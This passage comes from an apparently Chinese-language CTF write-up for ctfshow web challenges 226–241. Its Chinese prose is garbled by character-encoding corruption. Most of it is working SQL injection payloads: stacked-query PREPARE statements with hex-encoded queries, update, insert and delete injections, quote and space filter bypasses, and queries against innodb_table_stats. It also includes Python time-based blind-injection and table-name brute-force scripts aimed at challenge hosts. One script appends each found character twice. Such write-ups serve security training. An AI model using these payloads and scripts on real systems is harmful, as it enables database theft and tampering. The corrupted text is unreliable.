first;</code></pre><p><strong>È¢ÑÂ§ÑÁêÜ</strong></p><p>Âà©Áî®concatÁªïËøá‰∏ÄÂàáËøáÊª§Ôºå‰πãÂêéÂ∞±ÊòØÊõøÊç¢ÂêéÈù¢ÁöÑdatabase()‰∏∫ÊÉ≥Ë¶ÅÊâßË°åÁöÑËØ≠Âè•Âç≥ÂèØÔºåÂà´Âøò‰∫ÜÂä†Á©∫Ê†º</p><p>ÂØπ‰∫é‰∏çÁü•ÈÅìÂï•ÊòØÈ¢ÑÂ§ÑÁêÜÔºö<a href="https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160652999219721940215459%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160652999219721940215459&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&utm_term=%E5%BC%BA%E7%BD%91%E6%9D%AF&spm=1018.2118.3001.4450">SQlÊ≥®ÂÖ•Âº∫ÁΩëÊùØ 2019</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">username&#x3D;user1&#39;;PREPARE y4tacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; database()&#39;);EXECUTE y4tacker;</code></pre><p>ÂΩìÁÑ∂<code>concat(char(115,101,108,101,99,116)</code>‰πüÂèØ‰ª•‰ª£Êõø<code>select</code></p><p><strong>show</strong> Â±ïÁ§∫‰∏Ä‰∏ãË°®ÂêçÂàóÂêç</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">&#39;;show tables;#&#39;;show columns from &#96;ctfshow_flagasa&#96;;#</code></pre><h4 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//Â∏àÂÇÖËØ¥ËøáÊª§ÁöÑË∂äÂ§öË∂äÂ•Ω</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>   </code></pre><p>ban‰∫Ü<code>show</code>Âíå<code>(</code>ÔºåÂèØ‰ª•‰ΩøÁî®16ËøõÂà∂ÁªïËøá</p><p><img src="web226.png" loading="lazy"></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;EXECUTE hsad;</code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasb from ctfsh_ow_flagas?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE hsad;</code></pre><h4 id="web227-information-schema-Routines"><a href="#web227-information-schema-Routines" class="headerlink" title="web227(information_schema.Routines)"></a>web227(information_schema.Routines)</h4><p>ËøôÈÅìÈ¢òÔºå‰Ω†Â∞±ÁÆóÊâæÈÅçÊâÄÊúâÂú∞ÊñπÂü∫Êú¨‰∏äÈÉΩÊâæ‰∏çÂà∞flagË°®<br>ÂÖàÁªôÂá∫ÂÖ∂‰∏≠‰∏Ä‰∏™<code>payload1&#39;;call getFlag();</code>ËôΩÁÑ∂ËÉΩÂæóÂà∞Á≠îÊ°à‰ΩÜÊòØÊÑè‰πâ‰∏çÂ§ß<br>ËøôÈÅìÈ¢òËÄÉÁÇπÂÖ∂ÂÆûÊòØÊü•ÁúãMySQLÁöÑÂ≠òÂÇ®ËøáÁ®ã<br><a href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQL‚Äî‚ÄîÊü•ÁúãÂ≠òÂÇ®ËøáÁ®ãÂíåÂáΩÊï∞</a></p><p><strong>Êü•ÁúãÂ≠òÂÇ®ËøáÁ®ãÂíåÂáΩÊï∞ÁöÑ‰ø°ÊÅØ</strong><br>Âú®  MySQL ‰∏≠ÔºåÂ≠òÂÇ®ËøáÁ®ãÂíåÂáΩÊï∞ÁöÑ‰ø°ÊÅØÂ≠òÂÇ®Âú®<code>information_schema</code>Êï∞ÊçÆÂ∫ì‰∏ãÁöÑ<code>Routines</code>Ë°®‰∏≠ÔºåÂèØ‰ª•ÈÄöËøáÊü•ËØ¢ËØ•Ë°®ÁöÑËÆ∞ÂΩïÊù•Êü•ËØ¢Â≠òÂÇ®</p><p>ËøáÁ®ãÂíåÂáΩÊï∞ÁöÑ‰ø°ÊÅØÔºåÂÖ∂Âü∫Êú¨ÁöÑËØ≠Ê≥ïÂΩ¢ÂºèÂ¶Ç‰∏ã:</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM information_schema.RoutinesWHERE ROUTINE_NAME&#x3D;&#39; sp_name&#39;;</code></pre><p>ÂÖ∂‰∏≠ÔºåROUTINE_NAME  Â≠óÊÆµ‰∏≠Â≠òÂÇ®ÁöÑÊòØÂ≠òÂÇ®ËøáÁ®ãÂíåÂáΩÊï∞ÁöÑÂêçÁß∞;   sp_name  ÂèÇÊï∞Ë°®Á§∫Â≠òÂÇ®ËøáÁ®ãÊàñÂáΩÊï∞ÁöÑÂêçÁß∞„ÄÇ</p><p>Êàë‰ª¨ÂéªÊü•<code>information_schema.routines</code>Ë°®</p><p><img src="web227.png" loading="lazy"></p><p>ÂèØ‰ª•ÁúãÂà∞getFlagÂáΩÊï∞ÔºåÂΩìÁÑ∂flagÁõ¥Êé•Â∞±Êúâ</p><h4 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h4><p>Êü•ËØ¢ËØ≠Âè•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ÂàÜÈ°µÊü•ËØ¢</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span><span class="token variable">$bansql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select char from banlist;"</span><span class="token punctuation">;</span>    </code></pre><p>ËøîÂõûÈÄªËæë</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//Â∏àÂÇÖËØ¥ÂÜÖÂÆπÂ§™Â§öÔºåÂ∞±ÂÜôÂÖ•Êï∞ÊçÆÂ∫ì‰øùÂ≠ò</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$banlist</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$banlist</span> <span class="token keyword">as</span> <span class="token variable">$char</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$char</span><span class="token operator">.</span><span class="token string double-quoted-string">"/i"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    </code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasba from ctfsh_ow_flagasaa?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c6167617362612066726f6d2063746673685f6f775f666c616761736161;EXECUTE hsad;</code></pre><h4 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasba from flag?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c6167617362612066726f6d20666c6167;EXECUTE hsad;</code></pre><h4 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select flagasbas from flagaabbx?username&#x3D;user1&#39;;PREPARE hsad from 0x73656c65637420666c616761736261732066726f6d20666c61676161626278;EXECUTE hsad;</code></pre><h4 id="web231-updateÊ≥®ÂÖ•"><a href="#web231-updateÊ≥®ÂÖ•" class="headerlink" title="web231(updateÊ≥®ÂÖ•)"></a>web231(updateÊ≥®ÂÖ•)</h4><p>Êü•ËØ¢ËØ≠Âè•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ÂàÜÈ°µÊü•ËØ¢</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update ctfshow_user set pass = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$password</span><span class="token punctuation">&#125;</span></span>' where username = '<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>';"</span><span class="token punctuation">;</span>    </code></pre><pre class="language-mysql" data-language="mysql"><code class="language-mysql">POST:Êü•Ë°®Âêç  banlist,ctfshow_user,flagapassword&#x3D;ctfshow&#39;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_name&#x3D;database())#&amp;username&#x3D;noÊü•ÂàóÂêç  id,flagas,infopassword&#x3D;ctfshow&#39;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flaga&#39;)#&amp;username&#x3D;nogetFlagpassword&#x3D;ctfshow&#39;,username&#x3D;(select flagas from flaga)#&amp;username&#x3D;no</code></pre><h4 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h4><p>Âíå‰∏ä‰∏ÄÈ¢òÁõ∏ÊØîÂ§öÁªô password Â•ó‰∫Ü‰∏ÄÂ±Ç md5 ÂáΩÊï∞ÂêéÈù¢ËøòÊúâ‰∏™<code>)</code>Ê≥®ÊÑèÈó≠ÂêàÔºåÂØπÂêéÈù¢ÁöÑ username Êó†ÂΩ±Âìç„ÄÇ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">POST:Êü•Ë°®Âêç  banlist,ctfshow_user,flagaapassword&#x3D;ctfshow&#39;),username&#x3D;(select group_concat(table_name) from information_schema.tables where table_name&#x3D;database())#&amp;username&#x3D;noÊü•ÂàóÂêç  id,flagass,infopassword&#x3D;ctfshow&#39;),username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flaga&#39;)#&amp;username&#x3D;nogetFlagpassword&#x3D;ctfshow&#39;),username&#x3D;(select flagas from flaga)#&amp;username&#x3D;no</code></pre><h4 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h4><p>Á¶ÅÁî®‰∫Ü<code>&#39;</code>Ôºå‰ΩÜÊòØÂèØ‰ª•Áî®<code>\</code></p><p>ÂÅáËÆæÊàë‰ª¨password‰º†ÂÖ•\Ôºåusername‰º†ÂÖ•,username&#x3D;database()#</p><p>ÈÇ£‰πàÊúÄÁªàÊûÑÊàêÁöÑËØ≠Âè•Â¶Ç‰∏ã</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">update ctfshow_user set pass &#x3D; &#39;\&#39; where username &#x3D; &#39;,username&#x3D;database()#&#39;Á≠â‰ª∑‰∫éupdate ctfshow_user set pass &#x3D; &#39;x&#39;,username&#x3D;database()#&#39;</code></pre><p>ÊâÄ‰ª•Â∞±ÂèØ‰ª•ÁªïËøá‰∫Ü„ÄÇ</p><p><strong>payload</strong></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#Ëé∑ÂèñË°®Âêç  banlist,ctfshow_user,flag233333password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())%23#Ëé∑ÂèñÂàóÂêç  id,flagass233,infopassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag233333&#39;)%23#Ëé∑ÂèñÊï∞ÊçÆpassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(flagass233) from flag233333)%23</code></pre><p>‰πüÂèØ‰ª•‰ΩøÁî®Áõ≤Ê≥®</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://c095983b-1faf-4d65-a053-ba620caed799.challenge.ctf.show/api/?page=1&amp;limit=10"</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># Êü•Êï∞ÊçÆÂ∫ì</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># Êü•Ë°®Âêç</span>        <span class="token comment"># payload = "select column_name from information_schema.columns where table_name='flag233333' limit 1,1"</span>        <span class="token comment"># Êü•Êï∞ÊçÆ</span>        payload <span class="token operator">=</span> <span class="token string">"select flagass233 from flag233333"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1' or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(0.05),1)#"</span></span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'4'</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#Ëé∑ÂèñË°®Âêç  banlist,ctfshow_user,flag23apassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())%23#Ëé∑ÂèñÂàóÂêç  id,flagass23s3,infopassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x666c6167323361)%23#Ëé∑ÂèñÊï∞ÊçÆpassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(flagass23s3) from flag23a)%23</code></pre><h4 id="web235-mysql-innodb-table-stats-Êó†ÂàóÂêçÊ≥®ÂÖ•"><a href="#web235-mysql-innodb-table-stats-Êó†ÂàóÂêçÊ≥®ÂÖ•" class="headerlink" title="web235(mysql.innodb_table_stats  Êó†ÂàóÂêçÊ≥®ÂÖ•)"></a>web235(mysql.innodb_table_stats  Êó†ÂàóÂêçÊ≥®ÂÖ•)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ËøáÊª§ or ' </span></code></pre><p>Âõ†‰∏∫orË¢´Á¶ÅÂØºËá¥<code>information_schema.tables</code>‰πüË¢´Á¶Å‰∫ÜÔºåÊàë‰ª¨ÂèØ‰ª•Áî®Ë°®<code>mysql.innodb_table_stats</code>Âíå<code>mysql.innodb_index_stats</code></p><p>Êù•‰ª£Êõø„ÄÇ</p><p><a href="https://www.jb51.net/article/134678.htm">Ê¶ÇËø∞MySQLÁªüËÆ°‰ø°ÊÅØ</a></p><blockquote><p>5.6.6ÂºÄÂßãÔºåMySQLÈªòËÆ§‰ΩøÁî®‰∫ÜÊåÅ‰πÖÂåñÁªüËÆ°‰ø°ÊÅØÔºåÂç≥INNODB_STATS_PERSISTENT&#x3D;ONÔºåÊåÅ‰πÖÂåñÁªüËÆ°‰ø°ÊÅØ‰øùÂ≠òÂú®Ë°®mysql.innodb_table_statsÂíåmysql.innodb_index_stats„ÄÇ</p></blockquote><p><a href="https://zhuanlan.zhihu.com/p/98206699">MysqlÊó†ÂàóÂêçÊ≥®ÂÖ•</a></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#Ëé∑ÂèñË°®Âêç  banlist,ctfshow_user,flag23a1password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())##Êü•Êï∞ÊçÆ‚Äî‚ÄîÁªÑÂêà  0x2d --&gt; -password&#x3D;\&amp;username&#x3D;,username&#x3D;(select concat(&#96;1&#96;,0x2d,&#96;2&#96;,&#96;3&#96;) from (select 1,2,3 union select * from flag23a1 limit 1,1)a);##Êü•Êï∞ÊçÆ‚Äî‚ÄîÈáçÂëΩÂêçÔºåÂΩì&#96;Ë¢´ËøáÊª§ÁöÑÊó∂ÂÄôpassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a);#</code></pre><h4 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ËøáÊª§ or ' flag</span></code></pre><p>ËøáÊª§ÁöÑÊòØËøîÂõûÁöÑflagÔºåÊâÄ‰ª•Áî®<code>to_base64</code>ÁªïËøá</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">#Ëé∑ÂèñË°®Âêç  banlist,ctfshow_user,flagapassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())##Êü•Êï∞ÊçÆ‚Äî‚ÄîÁªÑÂêà  0x2d --&gt; -password&#x3D;\&amp;username&#x3D;,username&#x3D;(select concat(&#96;1&#96;,0x2d,to_base64(&#96;2&#96;),&#96;3&#96;) from (select 1,2,3 union select * from flaga limit 1,1)a);##Êü•Êï∞ÊçÆ‚Äî‚ÄîÈáçÂëΩÂêçÔºåÂΩì&#96;Ë¢´ËøáÊª§ÁöÑÊó∂ÂÄôpassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select to_base64(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a);#</code></pre><h4 id="web237-insertÊ≥®ÂÖ•"><a href="#web237-insertÊ≥®ÂÖ•" class="headerlink" title="web237(insertÊ≥®ÂÖ•)"></a>web237(insertÊ≥®ÂÖ•)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ÊèíÂÖ•Êï∞ÊçÆ</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into ctfshow_user(username,pass) value('<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token punctuation">&#125;</span></span>','<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$password</span><span class="token punctuation">&#125;</span></span>');"</span><span class="token punctuation">;</span></code></pre><p>ÂêëvalueÂÄºÂÜÖËøõË°åÊèíÂÖ•ÔºåÂíåupdateÊ≥®ÂÖ•ÁöÑÈÄªËæë‰∏ÄÊ†∑</p><p><code>insert into table_name(column1, column2) value(value1,value2)</code></p><p>Âêëvalue1ËøõË°åÊ≥®ÂÖ•ÔºåÂ∞±‰ºöÂèòÊàê</p><p><code>insert into table_name(column1, column2) value( value1,(‰Ω†ÊÉ≥Ë¶ÅËæìÂá∫ÁöÑÂÄº) )#value2)</code></p><p>ÊâÄ‰ª•Ë¶ÅÊ≥®ÊÑèÂØπÊúÄÂêé‰∏Ä‰∏™Êã¨Âè∑ÁöÑÈó≠Âêà</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># Êü•Ë°®Âêç  banlist,ctfshow_user,flagusername&#x3D;z&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))#&amp;password&#x3D;1# Êü•ÂàóÂêç  id,flagass23s3,infousername&#x3D;zz&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;))#&amp;password&#x3D;1# getFlagusername&#x3D;zzz&#39;,(select flagass23s3 from flag))#&amp;password&#x3D;1</code></pre><h4 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h4><p>ËøáÊª§‰∫ÜÁ©∫Ê†ºÂèØ‰ª•Áî®<code>()</code>ÁªïËøá</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># Êü•Ë°®Âêç  banlist,ctfshow_user,flagbusername&#x3D;z&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())))#&amp;password&#x3D;1# Êü•ÂàóÂêç  id,flag,infousername&#x3D;zz&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;flagb&#39;)))#&amp;password&#x3D;1# getFlagusername&#x3D;zzz&#39;,(select(flag)from(flagb)))#&amp;password&#x3D;1</code></pre><h4 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ËøáÊª§Á©∫Ê†º or </span></code></pre><p>Âíå‰πãÂâç‰∏ÄÊ†∑ÂèØ‰ª•‰ΩøÁî®mysql.innodb_table_stats</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># Êü•Ë°®Âêç  banlist,ctfshow_user,flagbbusername&#x3D;z&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name&#x3D;database())))#&amp;password&#x3D;1# getFlagusername&#x3D;zz&#39;,(select(flag)from(flagbb)))#&amp;password&#x3D;1#  ‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàÊó†ÂàóÂêçÊ≥®ÂÖ•‰∏çË°åÔºåwpÈÉΩÊòØÁõ≤ÁåúÂàóÂêçusername&#x3D;zz&#39;,(select(concat(&#96;1&#96;,0x2d,&#96;2&#96;,&#96;3&#96;))from((select(1,2,3)(union)select(*)from(flagbb)limit(1,1))a)))#&amp;password&#x3D;1select(concat(&#96;1&#96;,0x2d,&#96;2&#96;,&#96;3&#96;))from((select(1,2,3)(union)select(*)from(flagbb)limit(1,1))a)</code></pre><h4 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h4><p><strong>Hint</strong>: Ë°®ÂêçÂÖ±9‰ΩçÔºåflagÂºÄÂ§¥ÔºåÂêé‰∫î‰ΩçÁî±a&#x2F;bÁªÑÊàêÔºåÂ¶ÇflagabaabÔºåÂÖ®Â∞èÂÜô</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ËøáÊª§Á©∫Ê†º or sys mysql</span></code></pre><p>Ë°®ÂêçÈù†ÁàÜÁ†¥ÂàóÂêçÈù†Áåú</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> repost_url <span class="token operator">=</span> <span class="token string">"https://3db7384a-eef6-48e0-978e-5d0ddd2f9099.challenge.ctf.show/api/insert.php"</span>flag_url <span class="token operator">=</span> <span class="token string">"https://3db7384a-eef6-48e0-978e-5d0ddd2f9099.challenge.ctf.show/api/?desc&amp;page=1&amp;limit=10"</span>payloads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>    <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"\\"</span><span class="token punctuation">,</span>    <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f",(select(flag)from(flag</span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">&#125;</span></span><span class="token string">)))#"</span></span><span class="token punctuation">&#125;</span> <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>b<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>d<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token string">"ab"</span> <span class="token keyword">for</span> e <span class="token keyword">in</span> <span class="token string">"ab"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'ctfshow&#123;[0-9a-fA-F\-]+&#125;'</span><span class="token punctuation">)</span><span class="token keyword">for</span> payload <span class="token keyword">in</span> payloads<span class="token punctuation">:</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>post_url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>    response_flag <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>flag_url<span class="token punctuation">)</span>    <span class="token keyword">match</span> <span class="token operator">=</span> pattern<span class="token punctuation">.</span>search<span class="token punctuation">(</span>response_flag<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] Found: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] No flag found in the response."</span><span class="token punctuation">)</span></code></pre><h4 id="web241-deleteÊ≥®ÂÖ•"><a href="#web241-deleteÊ≥®ÂÖ•" class="headerlink" title="web241(deleteÊ≥®ÂÖ•)"></a>web241(deleteÊ≥®ÂÖ•)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//Âà†Èô§ËÆ∞ÂΩï</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"delete from  ctfshow_user where id = <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span></code></pre><p>Áõ≤Ê≥®</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://01d94186-8d77-44ea-a4c9-c70d61770349.challenge.ctf.show/api/delete.php"</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># Êü•Êï∞ÊçÆÂ∫ì  banlist,ctfshow_user,flag</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables 